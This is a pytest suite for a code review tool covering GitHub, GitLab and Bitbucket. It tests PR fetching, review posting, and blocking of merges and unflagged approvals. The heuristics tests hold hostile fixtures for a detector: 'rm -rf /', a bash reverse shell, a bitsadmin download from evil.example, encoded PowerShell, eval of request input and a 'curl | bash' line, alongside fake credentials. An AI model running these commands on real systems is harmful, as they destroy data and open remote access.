"""Multi-platform code review fetch/post and heuristics."""
from unittest.mock import AsyncMock, MagicMock

import pytest

from agent.classifier import classify_issue
from tools.code_review import (
    CodeReviewTools,
    detect_platform_from_url,
    scan_diff_heuristics,
)


class FakeResp:
    def __init__(self, status, payload=None, text=""):
        self.status_code = status
        self._payload = payload if payload is not None else {}
        self.text = text if text else (
            "" if not isinstance(payload, (dict, list)) else ""
        )
        if text:
            self.text = text
        elif isinstance(payload, str):
            self.text = payload
            self._payload = {}

    def json(self):
        return self._payload


class FakeClient:
    def __init__(self, routes):
        # routes: list of FakeResp in call order, or dict url-substring -> resp
        self.routes = routes
        self.calls = []
        self._i = 0

    async def get(self, url, params=None, headers=None, auth=None):
        self.calls.append(("GET", url, params))
        return self._next(url)

    async def post(self, url, headers=None, json=None, auth=None):
        self.calls.append(("POST", url, json))
        return self._next(url)

    def _next(self, url):
        if isinstance(self.routes, dict):
            for key, resp in self.routes.items():
                if key in url:
                    return resp
            return FakeResp(404, {"error": "missing"})
        resp = self.routes[self._i]
        self._i += 1
        return resp

    async def aclose(self):
        return None


class TestClassifierAndDetect:
    def test_code_review_classification(self):
        assert classify_issue("pull_request opened", {}) == "code_review"
        assert classify_issue("Merge Request", {}) == "code_review"
        assert classify_issue("alert", {"pr_number": "12"}) == "code_review"

    def test_detect_platform(self):
        assert detect_platform_from_url("https://github.com/a/b/pull/1") == "github"
        assert detect_platform_from_url("https://gitlab.com/a/b/-/merge_requests/2") == "gitlab"
        assert detect_platform_from_url("https://bitbucket.org/a/b/pull-requests/3") == "bitbucket"
        assert detect_platform_from_url("https://dev.azure.com/o/p/_git/r/pullrequest/4") == "azure_devops"


class TestHeuristics:
    def test_finds_secret_and_risk(self):
        diff = """\
+++ b/app/config.py
@@ -1,2 +1,4 @@
+API_KEY = "supersecretvalue123"
+rm -rf /
"""
        findings = scan_diff_heuristics(diff)
        messages = " ".join(f["message"] for f in findings)
        assert "secret" in messages.lower() or "key" in messages.lower()
        assert any("rm -rf" in f["message"] for f in findings)

    def test_finds_open_secrets_and_tokens(self):
        diff = """\
+++ b/.env
@@ -1,1 +1,8 @@
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+postgres://user:s3cretpass@db.internal:5432/app
+https://hooks.slack.com/services/T000/B000/XXXX
+ghp_abcdefghijklmnopqrstuvwxyz0123456789
+-----BEGIN RSA PRIVATE KEY-----
+password = "hunter2hunter2"
+SK1234567890abcdef1234567890abcdef
"""
        findings = scan_diff_heuristics(diff)
        messages = " ".join(f["message"].lower() for f in findings)
        assert "env-style" in messages or "secret" in messages
        assert "connection" in messages or "credential" in messages
        assert "slack" in messages or "github" in messages or "private key" in messages
        assert len(findings) >= 4
        assert any(f["severity"] == "critical" for f in findings)

    def test_finds_backdoor_and_malware(self):
        diff = """\
+++ b/scripts/setup.bat
@@ -1,1 +1,5 @@
+bitsadmin /transfer job https://evil.example/a.exe C:\\a.exe
+powershell -enc SQBFAFgA
+bash -i >& /dev/tcp/1.2.3.4/443 0>&1
+eval(request.args.get('cmd'))
+curl http://x | bash
"""
        findings = scan_diff_heuristics(diff)
        messages = " ".join(f["message"].lower() for f in findings)
        assert "backdoor" in messages or "reverse" in messages
        assert "malware" in messages or "powershell" in messages or "bat" in messages
        assert any(f["severity"] == "critical" for f in findings)


class TestGitHubReview:
    @pytest.mark.asyncio
    async def test_fetch_and_dry_run_post(self, monkeypatch):
        monkeypatch.setenv("GITHUB_TOKEN", "ghp_test")
        monkeypatch.delenv("CODE_REVIEW_AUTO_POST", raising=False)
        monkeypatch.setenv("AUTO_APPLY", "false")

        meta = FakeResp(
            200,
            {
                "title": "Fix login",
                "user": {"login": "ada"},
                "html_url": "https://github.com/acme/app/pull/9",
                "base": {"ref": "main"},
                "head": {"ref": "fix"},
                "state": "open",
            },
        )
        files = FakeResp(
            200,
            [{"filename": "app.py", "status": "modified", "additions": 2, "deletions": 0}],
        )
        diff = FakeResp(200, text="+++ b/app.py\n@@ -1 +1,2 @@\n+print('hi')\n")
        client = FakeClient([meta, files, diff])
        tools = CodeReviewTools(client=client)

        fetched = await tools.fetch_change("github", "acme/app", "9")
        assert fetched["success"] is True
        assert fetched["title"] == "Fix login"
        assert fetched["files"][0]["path"] == "app.py"

        posted = await tools.post_review(
            "github",
            "acme/app",
            "9",
            "Looks fine with nits.",
            dry_run=True,
        )
        assert posted["dry_run"] is True
        assert posted["success"] is True

    @pytest.mark.asyncio
    async def test_post_live_github(self, monkeypatch):
        monkeypatch.setenv("GITHUB_TOKEN", "ghp_test")
        monkeypatch.setenv("CODE_REVIEW_AUTO_POST", "true")
        review = FakeResp(201, {"id": 55, "html_url": "https://github.com/acme/app/pull/9#pullrequestreview-55"})
        client = FakeClient([review])
        tools = CodeReviewTools(client=client)
        result = await tools.post_review(
            "github",
            "acme/app",
            "9",
            "Request changes: missing tests",
            event="REQUEST_CHANGES",
            comments=[{"path": "app.py", "line": 10, "body": "Add a test"}],
            dry_run=False,
        )
        assert result["success"] is True
        assert result["review_id"] == 55
        body = client.calls[0][2]
        assert body["event"] == "REQUEST_CHANGES"
        assert body["comments"][0]["path"] == "app.py"

    @pytest.mark.asyncio
    async def test_never_merges(self, monkeypatch):
        monkeypatch.setenv("CODE_REVIEW_AUTO_POST", "true")
        tools = CodeReviewTools(client=FakeClient([]))
        result = await tools.post_review(
            "github", "acme/app", "1", "merge it", event="MERGE", dry_run=False
        )
        assert result["blocked"] is True


class TestGitLabAndBitbucket:
    @pytest.mark.asyncio
    async def test_gitlab_fetch(self, monkeypatch):
        monkeypatch.setenv("GITLAB_TOKEN", "glpat")
        monkeypatch.setenv("GITLAB_URL", "https://gitlab.com")
        meta = FakeResp(
            200,
            {
                "title": "MR",
                "author": {"username": "ada"},
                "web_url": "https://gitlab.com/a/b/-/merge_requests/3",
                "target_branch": "main",
                "source_branch": "feat",
                "state": "opened",
            },
        )
        changes = FakeResp(
            200,
            {
                "changes": [
                    {
                        "old_path": "a.py",
                        "new_path": "a.py",
                        "diff": "+x = 1\n",
                    }
                ]
            },
        )
        client = FakeClient([meta, changes])
        result = await CodeReviewTools(client=client).fetch_change("gitlab", "a/b", "3")
        assert result["success"] is True
        assert "a.py" in result["diff"]

    @pytest.mark.asyncio
    async def test_bitbucket_fetch(self, monkeypatch):
        monkeypatch.setenv("BITBUCKET_USERNAME", "u")
        monkeypatch.setenv("BITBUCKET_APP_PASSWORD", "p")
        meta = FakeResp(
            200,
            {
                "title": "BB PR",
                "author": {"display_name": "Ada"},
                "links": {"html": {"href": "https://bitbucket.org/w/r/pull-requests/2"}},
                "destination": {"branch": {"name": "main"}},
                "source": {"branch": {"name": "feat"}},
                "state": "OPEN",
            },
        )
        diff = FakeResp(200, text="+++ b/x.py\n+hi\n")
        files = FakeResp(
            200,
            {
                "values": [
                    {
                        "status": "modified",
                        "new": {"path": "x.py"},
                        "lines_added": 1,
                        "lines_removed": 0,
                    }
                ]
            },
        )
        client = FakeClient([meta, diff, files])
        result = await CodeReviewTools(client=client).fetch_change("bitbucket", "w/r", "2")
        assert result["success"] is True
        assert result["files"][0]["path"] == "x.py"

    @pytest.mark.asyncio
    async def test_approve_forced_to_comment_without_flag(self, monkeypatch):
        monkeypatch.setenv("GITHUB_TOKEN", "t")
        monkeypatch.setenv("CODE_REVIEW_AUTO_POST", "true")
        monkeypatch.delenv("CODE_REVIEW_ALLOW_APPROVE", raising=False)
        review = FakeResp(201, {"id": 1, "html_url": "http://x"})
        client = FakeClient([review])
        result = await CodeReviewTools(client=client).post_review(
            "github", "a/b", "1", "LGTM", event="APPROVE", dry_run=False
        )
        assert result["success"] is True
        assert client.calls[0][2]["event"] == "COMMENT"
